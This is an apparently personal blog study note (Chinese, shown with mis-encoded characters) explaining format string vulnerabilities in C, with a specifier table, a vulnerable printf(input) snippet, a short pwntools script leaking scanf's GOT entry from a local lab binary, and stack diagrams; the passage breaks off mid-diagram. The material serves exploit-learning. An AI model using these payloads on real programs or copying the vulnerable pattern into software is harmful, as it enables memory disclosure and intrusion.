<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="zach0ry">
    
    <title>
        
            æ ¼å¼åŒ–å­—ç¬¦ä¸² |
        
        b1nary
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/fire.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/","archives":"/archives"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/fire.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               b1nary
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        æ ¼å¼åŒ–å­—ç¬¦ä¸²
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/author.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">zach0ry</span>
                                
                                    <span class="author-badge">Lv3</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-07-21 09:05:48</span>
            </span>

            
                <span class="meta-info-item post-update-date">
                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                    <span class="datetime" data-updated="Sat Aug 16 2025 19:59:29 GMT+0800">2025-08-16 19:59:29</span>
                </span>
            
        

        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a></li>
                        
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn-study/">pwn_study</a></li>
                        
                    
                </ul>
            </span>
        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å®ƒè§£æä¹‹åçš„å‚æ•°ã€‚</p>
<p>é€šä¿—æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°çš„ä½œç”¨æ˜¯å°†è®¡ç®—æœºå†…å­˜ä¸­çš„æ•°æ®è½¬åŒ–ä¸ºäººç±»å¯è¯»çš„å­—ç¬¦ä¸²æ ¼å¼ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p>
<p>(1ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚</p>
<p>(2ï¼‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</p>
<p>(3ï¼‰åç»­å‚æ•°ï¼Œå¯é€‰ã€‚</p>
<p>ç”¨<code>printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalaryï¼‰</code></p>
<p>printfå‡½æ•°å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼Œâ€name:%s,age:%d,salary:%4.2fâ€å«ä½œæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œâ€œmyname,myage,mysalaryâ€å«ä½œåç»­å‚æ•°ã€‚</p>
<h3 id="ğŸ§±-å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å·"><a href="#ğŸ§±-å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å·" class="headerlink" title="ğŸ§± å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å·"></a>ğŸ§± å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¦å·</h3><table>
<thead>
<tr>
<th>æ ¼å¼ç¬¦</th>
<th>ä½œç”¨</th>
<th>ç¤ºä¾‹</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>%x</code>&#x2F;<code>%p</code></td>
<td>ä»¥åå…­è¿›åˆ¶å½¢å¼è¾“å‡ºæ ˆä¸Šçš„å€¼</td>
<td><code>%x</code>â†’<code>0xdeadbeef</code></td>
<td><code>%p</code>é€šå¸¸å¸¦<code>0x</code>å‰ç¼€</td>
</tr>
<tr>
<td><code>%d</code>&#x2F;<code>%u</code></td>
<td>ä»¥åè¿›åˆ¶è¾“å‡ºæ ˆä¸Šçš„å€¼</td>
<td><code>%d</code>â†’<code>3735928559</code></td>
<td></td>
</tr>
<tr>
<td><code>%c</code></td>
<td>è¾“å‡ºæ ˆä¸Šå€¼çš„æœ€ä½ä¸€ä¸ªå­—èŠ‚</td>
<td><code>%c</code>â†’<code>&#39;A&#39;</code></td>
<td></td>
</tr>
<tr>
<td><code>%s</code></td>
<td>æŠŠæ ˆä¸Šçš„å€¼å½“ä½œåœ°å€ï¼Œè¾“å‡ºè¯¥åœ°å€çš„å­—ç¬¦ä¸²</td>
<td><code>%s</code>â†’<code>&quot;Hello&quot;</code></td>
<td></td>
</tr>
<tr>
<td><code>%hn</code></td>
<td>å†™å…¥ 2 å­—èŠ‚ï¼ˆshortï¼‰</td>
<td><code>%hn</code>â†’ å†™å…¥ä½ 2 å­—èŠ‚</td>
<td></td>
</tr>
<tr>
<td><code>%hhn</code></td>
<td>å†™å…¥ 1 å­—èŠ‚ï¼ˆcharï¼‰</td>
<td><code>%hhn</code>â†’ å†™å…¥ä½ 1 å­—èŠ‚</td>
<td></td>
</tr>
<tr>
<td><code>%n</code></td>
<td>å°†å·²è¾“å‡ºå­—ç¬¦æ•°å†™å…¥æ ˆä¸Šçš„åœ°å€</td>
<td><code>%n</code>â†’ å†™å…¥<code>0x4</code>åˆ°æŒ‡å®šåœ°å€</td>
<td></td>
</tr>
<tr>
<td><code>%$p</code>&#x2F;<code>%%$s</code></td>
<td>æŒ‡å®šç¬¬å‡ ä¸ªå‚æ•°ä½ç½®çš„å€¼</td>
<td><code>%4$p</code>â†’ ç¬¬ 4 ä¸ªå‚æ•°</td>
<td></td>
</tr>
<tr>
<td><code>%%</code></td>
<td>è¾“å‡ºä¸€ä¸ª<code>%</code>å­—ç¬¦æœ¬èº«</td>
<td><code>%%</code>â†’<code>%</code></td>
<td></td>
</tr>
</tbody></table>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721092127879.png"  alt="image-20250721092127879"><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721092639513.png"  alt="image-20250721092639513"></p>
<p>å½“ç”¨æˆ·æ§åˆ¶äº† <code>printf()</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰ï¼Œè€Œç¨‹åºæ²¡æœ‰è¿›è¡Œè¿‡æ»¤æˆ–é™åˆ¶ï¼Œå°±å¯èƒ½é€ æˆä»¥ä¸‹é—®é¢˜ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char input[100];</span><br><span class="line">fgets(input, sizeof(input), stdin);</span><br><span class="line">printf(input);  // âš ï¸ å±é™©ï¼ç”¨æˆ·è¾“å…¥ç›´æ¥ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ è¾“å…¥ï¼Œå¦‚ï¼š</p>
<p>%x %x %x %x %s</p>
<p>ç¨‹åºä¼šå°è¯•ä»æ ˆä¸­è¯»å–å‚æ•°ï¼Œä½†ç”±äºæ²¡æœ‰æä¾›å‚æ•°åˆ—è¡¨ï¼Œ<code>printf()</code> ä¼šç»§ç»­ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ã€‚è¿™å¯èƒ½å¯¼è‡´ï¼š</p>
<ul>
<li><p>æ³„éœ²æ ˆå†…å­˜å†…å®¹ï¼ˆå¦‚è¿”å›åœ°å€ã€canaryã€å‡½æ•°æŒ‡é’ˆç­‰ï¼‰</p>
</li>
<li><p>å†™å…¥å†…å­˜ï¼ˆé€šè¿‡ <code>%n</code> æ ¼å¼ç¬¦ï¼‰</p>
</li>
</ul>
<p>è™½ç„¶æ²¡æœ‰å†™ä»»ä½•å‚æ•°ï¼Œä½†è¿˜æ˜¯ä¼šå¯¹åº”åœ°è§£æå‚æ•°ï¼Œå› ä¸ºåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­å†™äº†å¯¹åº”çš„è§£ææ–¹å¼ï¼Œæ‰€ä»¥åœ¨åç»­çš„å‡½æ•°è¿è¡Œä¸­ä¼šè§£ææ ˆä¸Šçš„å…ƒ</p>
<p>ç´ ã€‚å¯¹äºæ•´å‹å€¼å’Œæµ®ç‚¹å€¼ï¼Œè¿™æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä¸ç®¡æ ˆä¸Šæ˜¯ä»€ä¹ˆæ•°æ®éƒ½èƒ½å¤ŸæŒ‰ç…§æ•´å‹å€¼å’Œæµ®ç‚¹å€¼è§£æå‡ºæ¥ï¼Œè€Œå­—ç¬¦ä¸²å½¢å¼å°±ä¸ä¸€å®šèƒ½è§£æå‡ºæ¥</p>
<p>äº†ã€‚å¦‚æœæ˜¯ä¸€ä¸ªéæ³•åœ°å€ï¼Œæ¯”å¦‚NULLï¼Œé‚£ä¹ˆåœ¨è§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œ</p>
<p>å› ä¸ºè¿™ä¸ªåœ°å€æŒ‰ç…§å­—ç¬¦ä¸²è§£ææ˜¯æ— æ³•è§£æå‡ºæ¥çš„ï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚è¿™å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åŸºæœ¬åŸç†</p>
<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><h3 id="leakmemory-æ³„éœ²æ ˆä¸Šå†…å®¹"><a href="#leakmemory-æ³„éœ²æ ˆä¸Šå†…å®¹" class="headerlink" title="leakmemory(æ³„éœ²æ ˆä¸Šå†…å®¹)"></a>leakmemory(æ³„éœ²æ ˆä¸Šå†…å®¹)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721102525461.png"  alt="image-20250721102525461"></p>
<p>ç”¨äº† <code>%100s</code> æ¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºï¼Œä½†<strong>å¹¶æ²¡æœ‰é™åˆ¶ç”¨æˆ·è¾“å…¥çš„æ ¼å¼ç¬¦å†…å®¹</strong> ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<ul>
<li><p>ç”¨æˆ·å¯ä»¥è¾“å…¥ <code>%x</code>ã€<code>%s</code>ã€<code>%n</code> ç­‰æ ¼å¼ç¬¦ã€‚</p>
</li>
<li><p><code>printf</code> ä¼šæ ¹æ®è¿™äº›æ ¼å¼ç¬¦ä»æ ˆä¸­â€œçŒœæµ‹â€æ•°æ®ï¼Œä»è€Œé€ æˆä¿¡æ¯æ³„éœ²æˆ–ä»»æ„åœ°å€å†™å…¥ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721102907893.png"  alt="image-20250721102907893"></p>
</li>
</ul>
<h3 id="leakmemory-æ³„éœ²ä»»æ„åœ°å€å†…å­˜"><a href="#leakmemory-æ³„éœ²ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="leakmemory(æ³„éœ²ä»»æ„åœ°å€å†…å­˜)"></a>leakmemory(æ³„éœ²ä»»æ„åœ°å€å†…å­˜)</h3><p>è¿™é‡Œçš„ç›®æ ‡è®¾ç«‹æ³„éœ²isoc99_scanfå‡½æ•°ï¼ˆscanfç¼–è¯‘ä¹‹åæ˜¯isoc99_scanfåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼‰ã€‚</p>
<p><code>%k$s</code></p>
<p>è¿™é‡Œçš„pæ˜¯å¯ä»¥æ›´æ¢çš„ï¼Œæ¯”å¦‚æ›´æ¢ä¸ºså°±å¯ä»¥è§£ææ ˆä¸Šçš„æ•°æ®ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>kï¼šè¡¨ç¤ºè¦æ‰“å°çš„å‚æ•°è·ç¦»ç›®å‰æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„è·ç¦»ã€‚</p>
<p>å› ä¸ºåœ¨æ²¡æœ‰ç»™printfæä¾›å¯¹åº”çš„å­—ç¬¦ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ª<strong>å¯å˜å‚æ•°å‡½æ•°</strong> ï¼Œå®ƒä¼šä»æ ˆä¸Šä¾æ¬¡è¯»å–æ•°æ®æ¥å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„ <code>%p</code>ã€<code>%x</code>ã€<code>%s</code>ã€<code>%n</code> ç­‰æŒ‡ä»¤ã€‚</p>
<p>ä½†ä½ å¹¶ä¸çŸ¥é“ä½ è¾“å…¥çš„å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„å…·ä½“ä½ç½®ï¼Œæ‰€ä»¥ä½ éœ€è¦ï¼š</p>
<blockquote>
<p><strong>æ‰¾åˆ°ä½ çš„è¾“å…¥å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„åç§»é‡ï¼Œæ‰èƒ½ç²¾å‡†æ§åˆ¶è¯»å†™çš„å†…å®¹ã€‚</strong> </p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721145854783.png"  alt="image-20250721145854783"></p>
<p>æ‰€ä»¥åç§»é‡å°±æ˜¯4</p>
<p>æ‰€ä»¥æ„é€ payload &#x3D; p32(scanf_got) + â€œ%4$sâ€</p>
<p>ç›¸å½“äºprint(p32(scanf_got) + â€œ%4$sâ€)</p>
<p>æ‰€ä»¥å‰å››ä¸ªå­—èŠ‚æ˜¯è¾“å‡ºçš„scanfçš„gotè¡¨</p>
<blockquote>
<p> ğŸ§  å…³é”®åŒºåˆ«ï¼š<strong>åœ°å€ vs åœ°å€çš„å†…å®¹</strong></p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>scanf_got</code></td>
<td>GOT è¡¨ä¸­<code>scanf</code>çš„åœ°å€ï¼ˆ<code>.got</code>æ®µä¸­çš„ä¸€ä¸ªä½ç½®ï¼‰</td>
<td><code>0x804a008</code></td>
<td>å°±åƒä¹¦çš„ç›®å½•é¡µç </td>
</tr>
<tr>
<td>æ³„éœ²çš„åœ°å€ï¼ˆ<code>leak_addr</code>ï¼‰</td>
<td>è¿™ä¸ª GOT è¡¨é¡¹ä¸­å­˜å‚¨çš„å€¼ï¼ˆå³<code>scanf</code>çš„å®é™…åœ°å€ï¼‰</td>
<td><code>0xf7e01234</code></td>
<td>å°±åƒç›®å½•é¡µç æŒ‡å‘çš„é‚£ä¸€é¡µçš„å†…å®¹</td>
</tr>
</tbody></table>
<h4 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./leakmemory&quot;)</span><br><span class="line">elf = ELF(&quot;./leakmemory&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b printf&quot;)</span><br><span class="line"></span><br><span class="line">scanf_got = elf.got[&quot;__isoc99_scanf&quot;]</span><br><span class="line">payload=p32(scanf_got)+b&quot;%4$s&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak_addr = u32(p.recv(8)[4:])</span><br><span class="line">scanf_addr = leak_addr</span><br><span class="line">log.success(&quot;scanf_addr:&quot; + hex(scanf_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>printf</code> æ‰§è¡Œæµç¨‹ï¼š</p>
<ol>
<li><code>printf</code> ä¼šä»æ ˆä¸Šè¯»å–å‚æ•°ï¼›</li>
<li>å®ƒçœ‹åˆ° <code>%4$s</code>ï¼Œä¼šä»ç¬¬ 4 ä¸ªå‚æ•°ä½ç½®è¯»å–ä¸€ä¸ªåœ°å€ï¼›</li>
<li>è¿™ä¸ªåœ°å€æ˜¯ <code>0x804a018</code>ï¼ˆä½ å†™å…¥çš„ GOT åœ°å€ï¼‰ï¼›</li>
<li>ç„¶åä» <code>0x804a018</code> åœ°å€ä¸­è¯»å‡ºä¸€ä¸ªæŒ‡é’ˆï¼ˆæ¯”å¦‚ <code>0xf7e01234</code>ï¼Œå³ <code>scanf</code> çš„è¿è¡Œæ—¶åœ°å€ï¼‰ï¼›</li>
<li><code>%s</code> ä¼šä» <code>0xf7e01234</code> å¼€å§‹è¯»å–å­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ° <code>\0</code>ï¼›</li>
<li>æœ€ç»ˆä½ æ¥æ”¶åˆ°çš„æ•°æ®ä¸­åŒ…å« <code>0xf7e01234</code>ã€‚</li>
</ol>
<p>ğŸ“Œ æ€»ç»“</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>elf.got[&quot;scanf&quot;]</code>å’Œ<code>elf.got[&quot;__isoc99_scanf&quot;]</code>ä¸€æ ·å—ï¼Ÿ</td>
<td>ä¸ä¸€å®šï¼Œå–å†³äºç¼–è¯‘å™¨</td>
</tr>
<tr>
<td>ä¸ºä»€ä¹ˆä¼šæœ‰<code>__isoc99_scanf</code>ï¼Ÿ</td>
<td>GCC ç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒ C99 æ ‡å‡†å¼•å…¥çš„</td>
</tr>
<tr>
<td>æ€ä¹ˆç¡®è®¤ç”¨å“ªä¸ªï¼Ÿ</td>
<td>ç”¨<code>readelf -r</code>æˆ–<code>objdump -TR</code>æŸ¥çœ‹ GOT è¡¨</td>
</tr>
<tr>
<td>èƒ½ä¸èƒ½æ›¿æ¢ï¼Ÿ</td>
<td>åªæœ‰ GOT è¡¨ä¸­å­˜åœ¨å¯¹åº”ç¬¦å·æ—¶æ‰èƒ½æ›¿æ¢</td>
</tr>
<tr>
<td>å¦‚æœå†™é”™äº†ä¼šæ€æ ·ï¼Ÿ</td>
<td>æŠ¥é”™ï¼š<code>KeyError</code></td>
</tr>
</tbody></table>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721150514526.png"  alt="image-20250721150514526"></p>
<h4 id="å‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹"><a href="#å‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹" class="headerlink" title="å‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹"></a>å‡½æ•°è°ƒç”¨å®Œæ•´è¿‡ç¨‹</h4><p>ğŸŒŸ é˜¶æ®µ 0ï¸âƒ£ï¼šåœ¨ <code>vulnfunc</code> é‡Œï¼ˆè°ƒç”¨ printf ä¹‹å‰ï¼‰</p>
<p>è¿™æ˜¯å·²ç»åœ¨ <code>vulnfunc</code> é‡Œï¼Œä¸”æ ˆå¸§å·²ç»å»ºç«‹å¥½äº†ã€‚<br> æ ˆé¡¶åœ¨ espï¼Œæ ˆä½åœ¨é«˜åœ°å€æ–¹å‘ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">     â†‘ é«˜åœ°å€</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| å‚æ•°nï¼ˆå¯èƒ½æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼‰       |</span><br><span class="line">| å‚æ•°2                        |</span><br><span class="line">| å‚æ•°1                        |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| è¿”å›åœ°å€ â†’ main              |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| ä¸Šä¸€ä¸ª ebp                   | â† ebp (vulnfunc çš„ ebp)</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| vulnfunc å±€éƒ¨å˜é‡            |</span><br><span class="line">| â€¦                            | â† esp ï¼ˆåœ¨ vulnfunc é‡Œï¼‰</span><br><span class="line">      â†“ ä½åœ°å€</span><br></pre></td></tr></table></figure>

<p>å½“ä½ åˆšè¿›å…¥ <code>vulnfunc</code>ï¼š</p>
<ul>
<li><p><code>ebp</code> â†’ ä¸Šä¸€ä¸ª ebp</p>
</li>
<li><p><code>ebp+4</code> â†’ è¿”å›åœ°å€ï¼ˆè¿”å›åˆ° mainï¼‰</p>
</li>
<li><p><code>ebp-xx</code> â†’ vulnfunc çš„å±€éƒ¨å˜é‡</p>
</li>
<li><p><code>esp</code> â†’ æœ€ä½å¤„ï¼ŒæŒ‡å‘å±€éƒ¨å˜é‡</p>
</li>
</ul>
<p>ğŸŒŸ é˜¶æ®µ 1ï¸âƒ£ï¼šè°ƒç”¨ <code>printf(format)</code></p>
<p>å½“ vulnfunc è°ƒç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">printf(format);</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨è€…æŠŠè¿”å›åœ°å€ &amp; å‚æ•°å‹å…¥æ ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">     â†‘ é«˜åœ°å€</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰           |</span><br><span class="line">| â€¦                            |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| è¿”å›åœ°å€ â†’ main              |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| ä¸Šä¸€ä¸ª ebp                   | â† ebp (vulnfunc)</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| vulnfunc å±€éƒ¨å˜é‡            |</span><br><span 